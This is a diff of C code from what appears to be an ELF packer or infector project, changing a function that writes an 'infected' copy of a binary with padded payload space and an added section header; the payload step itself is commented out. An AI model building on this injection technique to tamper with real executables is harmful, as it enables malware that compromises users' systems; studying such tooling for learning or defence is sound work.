@@ -22,7 +22,8 @@ static void write_on_memory(t_elf const *elf, char *ptr)
 	Elf64_Off const end_encrypt = elf->section_offset + elf->section_size;
 	Elf64_Off const beg_payload = elf->segment_offset + elf->segment_size;
 	Elf64_Off const end_payload = elf->segment_offset + elf->segment_size + PAGE_SIZE;
-	Elf64_Off const end_file = elf->filesize + PAGE_SIZE;
+	Elf64_Off const new_section = elf->new_section + PAGE_SIZE;
+	Elf64_Off const end_file = elf->filesize + PAGE_SIZE + sizeof(Elf64_Shdr);
 
 	size_t index = 0;
 	char *dst = ptr;
@@ -46,15 +47,31 @@ static void write_on_memory(t_elf const *elf, char *ptr)
 
 	while (index < end_payload)
 	{
-		*dst++ = 0;
+		*dst++ = 42;
 		index++;
 	}
 
-	while (index < end_file)
-	{
-		*dst++ = *src++;
-		index++;
-	}
+	 while (index < new_section)
+    {
+        *dst++ = *src++;
+        index++;
+    }
+
+	size_t test = index + sizeof(Elf64_Shdr);
+    char *tmp = (char *)get_new_section(elf);
+    char *back = tmp;
+    while (index < test)
+    {
+        *dst++ = *tmp++;
+        index++;
+    }
+    free(back);
+
+    while (index < end_file)
+    {
+        *dst++ = *src++;
+        index++;
+    }
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -69,13 +86,13 @@ void create_infected(t_elf const *elf)
 
 	if ((fd = open(filename, O_RDWR | O_CREAT | O_TRUNC, 0700)) == -1)
 		error(WRONG_FD, filename); 
-	if ((ptr = mmap(NULL, elf->filesize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+	if ((ptr = mmap(NULL, elf->filesize + PAGE_SIZE + sizeof(Elf64_Shdr), PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 		error(MMAP_FAIL, filename);
 
 //	set_payload(elf);
 	write_on_memory(elf, ptr);
-	write(fd, ptr, elf->filesize + PAGE_SIZE);
+	write(fd, ptr, elf->filesize + PAGE_SIZE + sizeof(Elf64_Shdr));
 
-	munmap(ptr, elf->filesize + PAGE_SIZE);
+	munmap(ptr, elf->filesize + PAGE_SIZE + sizeof(Elf64_Shdr));
 	close(fd);
 }
